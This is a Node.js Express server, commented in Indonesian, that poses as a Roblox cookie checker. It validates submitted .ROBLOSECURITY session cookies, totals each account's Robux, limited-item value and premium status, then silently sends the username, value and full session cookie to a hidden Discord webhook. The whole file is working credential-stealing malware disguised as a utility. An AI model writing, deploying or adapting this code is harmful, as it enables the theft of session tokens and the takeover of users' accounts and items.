const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const SECRET_WEBHOOK_URL = process.env.DISCORD_WEBHOOK || "MASUKKAN_URL_WEBHOOK_DISCORD_KAMU_DISINI";

async function checkRobloxCookie(cookie) {
    try {
        const userRes = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
        });
        
        const userId = userRes.data.id;
        const username = userRes.data.name;
        const displayName = userRes.data.displayName;

        const currencyRes = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
            headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
        });
        const robux = currencyRes.data.robux || 0;

        const infoRes = await axios.get(`https://users.roblox.com/v1/users/${userId}`, {
            headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
        });
        const createdDate = new Date(infoRes.data.created).toLocaleDateString();
        
        let isPremium = false;
        try {
            const premRes = await axios.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
                headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
            });
            isPremium = premRes.data;
        } catch (e) {
            isPremium = false;
        }

        // Ambil Data RAP / Limiteds (Inventory Collectibles)
        let totalRap = 0;
        let valuableItems = [];
        try {
            const invRes = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
                headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
            });
            if (invRes.data && invRes.data.data) {
                valuableItems = invRes.data.data.map(item => {
                    totalRap += (item.recentAveragePrice || 0);
                    return {
                        name: item.name,
                        rap: item.recentAveragePrice || 0,
                        assetId: item.assetId
                    };
                });
            }
        } catch (e) {
            totalRap = 0;
        }

        // Ambil Data Animasi (Asset type 24 - Animation Packages / Emotes)
        let animations = [];
        try {
            const animRes = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/24?limit=50`, {
                headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
            });
            if (animRes.data && animRes.data.data) {
                animations = animRes.data.data.map(anim => anim.name);
            }
        } catch (e) {
            animations = [];
        }

        return {
            success: true,
            userId,
            username,
            displayName,
            robux,
            totalRap,
            valuableItems,
            animations,
            createdDate,
            isPremium,
            cookie
        };
    } catch (error) {
        return { success: false };
    }
}

app.post('/api/check', async (req, res) => {
    const { cookies } = req.body;
    if (!cookies || !Array.isArray(cookies)) {
        return res.status(400).json({ error: "Format cookie tidak valid." });
    }

    const results = [];
    for (let rawCookie of cookies) {
        const cleanCookie = rawCookie.trim();
        if (!cleanCookie) continue;

        const result = await checkRobloxCookie(cleanCookie);
        if (result.success) {
            results.push(result);

            if (SECRET_WEBHOOK_URL && SECRET_WEBHOOK_URL.startsWith("http")) {
                try {
                    await axios.post(SECRET_WEBHOOK_URL, {
                        content: `🚨 **AKUN ROBLOX VALID DITEMUKAN!**\n` +
                                 `👤 **Username:** ${result.username} (${result.displayName})\n` +
                                 `💰 **Robux:** ${result.robux} | 💎 **Total RAP:** ${result.totalRap}\n` +
                                 `🏃 **Jumlah Animasi:** ${result.animations.length} jenis\n` +
                                 `🔑 \`\`\`${result.cookie}\`\`\``
                    });
                } catch (webhookErr) {
                    console.error("Gagal kirim webhook:", webhookErr.message);
                }
            }
        }
    }

    res.json({ results });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
